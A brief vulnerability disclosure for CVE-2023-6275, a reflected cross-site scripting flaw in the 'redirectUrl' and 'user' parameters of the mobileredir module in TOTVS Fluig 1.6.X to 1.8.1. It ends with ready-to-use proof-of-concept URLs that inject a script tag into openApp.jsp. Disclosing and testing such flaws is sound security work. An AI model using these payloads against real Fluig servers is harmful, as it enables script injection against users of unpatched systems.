# CVE-2023-6275 - Reflected Cross-Site Scripting in TOTVS Fluig Plataform 1.6.X - 1.8.1

The TOTVS Fluig platform, in its versions from 1.6.1.X to 1.8.1, is vulnerable to Cross-Site Scripting in the 'redirectUrl' and 'user' parameters within the 'mobileredir' module.

Fluig is the productivity and collaboration platform that integrates with the ERP system, developed by Brazil's largest technology company, TOTVS, and hosted on the client's server.

Versions affecteds:

--
Fluig 1.6.X - Fluig 1.8.1
…

### Attack Vector

https://fluig.host.com/mobileredir/openApp.jsp?redirectUrl=PAYLOAD

https://fluig.host.com/mobileredir/openApp.jsp?user=PAYLOAD

### Payloads:

https://fluig.host.com/mobileredir/openApp.jsp?redirectUrl="><script>alert(document.domain)</script>
https://fluig.host.com/mobileredir/openApp.jsp?user="><script>alert(document.domain)</script>
